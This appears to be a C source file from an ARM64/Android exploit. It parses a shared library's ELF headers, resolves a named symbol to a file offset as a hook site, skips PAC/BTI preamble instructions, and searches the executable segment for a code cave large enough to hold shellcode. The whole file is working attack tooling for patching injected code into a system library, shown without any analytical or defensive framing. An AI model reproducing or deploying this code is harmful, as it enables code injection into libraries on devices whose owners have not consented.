#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/elf.h>
#include <stdio.h>

/* Find shellcode placement: use tail_off if it fits in its page's remaining slack,
 * otherwise fall back to the largest zero run (alignment padding) inside the
 * executable PT_LOAD segment. Sets *out_off to the chosen file offset. */
static int find_code_cave(int fd, uint64_t exec_off, uint64_t exec_filesz,
                           uint64_t tail_off, size_t shellcode_size,
                           uint64_t *out_off) {
    long pagesize = sysconf(_SC_PAGESIZE);
    uint64_t page_off = tail_off & ((uint64_t)pagesize - 1);
    uint64_t slack = page_off ? (uint64_t)pagesize - page_off : 0;
    if (shellcode_size <= slack) {
        *out_off = tail_off;
        return 0;
    }

    printf("shellcode (%zu) exceeds tail-page slack (%llu bytes)\n",
           shellcode_size, (unsigned long long)slack);

    if (lseek64(fd, exec_off, SEEK_SET) < 0) return 1;
    uint64_t run_start = 0, run_len = 0, max_run_len = 0;
    char page[4096];
    for (uint64_t done = 0; done < exec_filesz; done += sizeof(page)) {
        size_t chunk = exec_filesz - done;
        if (chunk > sizeof(page)) chunk = sizeof(page);
        ssize_t n = read(fd, page, chunk);
        if (n <= 0) break;
        for (ssize_t i = 0; i < n; i++) {
            if (page[i] == 0) {
                if (!run_len) run_start = exec_off + done + (uint64_t)i;
                if (++run_len >= shellcode_size) {
                    printf("using code cave at 0x%llx\n", (unsigned long long)run_start);
                    *out_off = run_start;
                    return 0;
                }
                if (run_len > max_run_len) max_run_len = run_len;
            } else {
                run_len = 0;
            }
        }
    }

    printf("no code cave large enough (need %zu, largest found %llu) - DEVICE NOT SUPPORTED\n",
           shellcode_size, (unsigned long long)max_run_len);
    return 1;
}

int find_hook_target(const char *libcxx, const char *symname,
                     uint64_t *hook_target, uint64_t *payload_target,
                     uint32_t *first_instruction, size_t shellcode_size) {
    *hook_target = 0;
    *payload_target = 0;

    int fd = open(libcxx, O_RDONLY);
    if (fd < 0) {
        printf("open %s failed: %s\n", libcxx, strerror(errno));
        return 1;
    }

    Elf64_Ehdr hdr;
    if (read(fd, (char *)&hdr, sizeof(hdr)) < (ssize_t)sizeof(hdr)) {
        printf("read ELF header from %s failed: %s\n", libcxx, strerror(errno));
        close(fd); return 1;
    }
    if (strncmp((char *)hdr.e_ident, "\x7f""ELF", 4) != 0) {
        printf("invalid ELF: %s\n", libcxx);
        close(fd); return 1;
    }
    if (lseek64(fd, hdr.e_phoff, SEEK_SET) < 0) {
        printf("lseek64 e_phoff failed: %s\n", strerror(errno));
        close(fd); return 1;
    }
    if (hdr.e_phentsize != sizeof(Elf64_Phdr)) {
        printf("invalid phentsize: %d\n", hdr.e_phentsize);
        close(fd); return 1;
    }

    uint64_t executable_off = 0, executable_filesz = 0;
    uint64_t executable_vaddr = 0;
    for (int i = 0; i < hdr.e_phnum; i++) {
        Elf64_Phdr phdr;
        if (read(fd, (char *)&phdr, sizeof(phdr)) < 0) {
            printf("read phdr[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (phdr.p_type == PT_LOAD && (phdr.p_flags & PF_X)) {
            *payload_target   = phdr.p_offset + phdr.p_filesz;
            executable_off    = phdr.p_offset;
            executable_filesz = phdr.p_filesz;
            executable_vaddr  = phdr.p_vaddr;
            break;
        }
    }

    if (executable_off == 0 && executable_vaddr == 0) {
        printf("no executable PT_LOAD segment found in %s\n", libcxx);
        close(fd); return 1;
    }

    if (lseek64(fd, hdr.e_shoff + hdr.e_shstrndx * sizeof(Elf64_Shdr), SEEK_SET) < 0) {
        printf("lseek64 shstrndx failed: %s\n", strerror(errno));
        close(fd); return 1;
    }
    Elf64_Shdr str_shdr;
    if (read(fd, (char *)&str_shdr, sizeof(str_shdr)) < 0) {
        printf("read shstrndx failed: %s\n", strerror(errno));
        close(fd); return 1;
    }

    uint64_t dynstr = 0, dynsym_offset = 0, dynsym_size = 0;
    for (int i = 0; i < hdr.e_shnum; i++) {
        Elf64_Shdr shdr;
        if (lseek64(fd, hdr.e_shoff + i * sizeof(Elf64_Shdr), SEEK_SET) < 0) {
            printf("lseek64 shdr[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (read(fd, (char *)&shdr, sizeof(shdr)) < 0) {
            printf("read shdr[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (lseek64(fd, shdr.sh_name + str_shdr.sh_offset, SEEK_SET) < 0) {
            printf("lseek64 sh_name[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        char name[100];
        if (read(fd, name, sizeof(name) - 1) < 0) {
            printf("read sh_name[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        name[sizeof(name) - 1] = 0;
        if (strcmp(name, ".dynstr") == 0) dynstr = shdr.sh_offset;
        if (strcmp(name, ".dynsym") == 0) { dynsym_offset = shdr.sh_offset; dynsym_size = shdr.sh_size; }
    }

    if (dynstr == 0 || dynsym_offset == 0) {
        printf(".dynstr or .dynsym not found in %s\n", libcxx);
        close(fd); return 1;
    }

    for (int i = 0; i < (int)(dynsym_size / sizeof(Elf64_Sym)); i++) {
        Elf64_Sym sym;
        if (lseek64(fd, dynsym_offset + i * sizeof(Elf64_Sym), SEEK_SET) < 0) {
            printf("lseek64 dynsym[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (read(fd, (char *)&sym, sizeof(sym)) < 0) {
            printf("read dynsym[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (lseek64(fd, dynstr + sym.st_name, SEEK_SET) < 0) {
            printf("lseek64 st_name[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        char name[200];
        if (read(fd, name, sizeof(name) - 1) < 0) {
            printf("read st_name[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        name[sizeof(name) - 1] = 0;
        if (strcmp(name, symname) == 0) {
            *hook_target = sym.st_value - executable_vaddr + executable_off;
            break;
        }
    }

    if (*hook_target == 0) {
        printf("symbol %s not found in %s\n", symname, libcxx);
        close(fd); return 1;
    }

    if (lseek64(fd, *hook_target, SEEK_SET) < 0) {
        printf("lseek64 hook_target failed: %s\n", strerror(errno));
        close(fd); return 1;
    }
    if (read(fd, first_instruction, sizeof(*first_instruction)) < 0) {
        printf("read first instruction failed: %s\n", strerror(errno));
        close(fd); return 1;
    }

    for (int adv = 0; adv < 2; adv++) {
        switch (*first_instruction) {
        case 0xd503233f: /* PACIASP  */
        case 0xd503237f: /* PACIBSP  */
        case 0xd503241f: /* BTI      */
        case 0xd503245f: /* BTI c    */
        case 0xd503249f: /* BTI j    */
        case 0xd50324df: /* BTI jc   */
            printf("BTI/PAC preamble at hook site, advancing +4\n");
            *hook_target += 4UL;
            if (read(fd, first_instruction, sizeof(*first_instruction)) < 0) {
                printf("read preamble +%d failed: %s\n", (adv + 1) * 4, strerror(errno));
                close(fd); return 1;
            }
            continue;
        default:
            break;
        }
        break;
    }

    if (find_code_cave(fd, executable_off, executable_filesz,
                       *payload_target, shellcode_size, payload_target)) {
        close(fd); return 1;
    }

    close(fd);
    return 0;
}
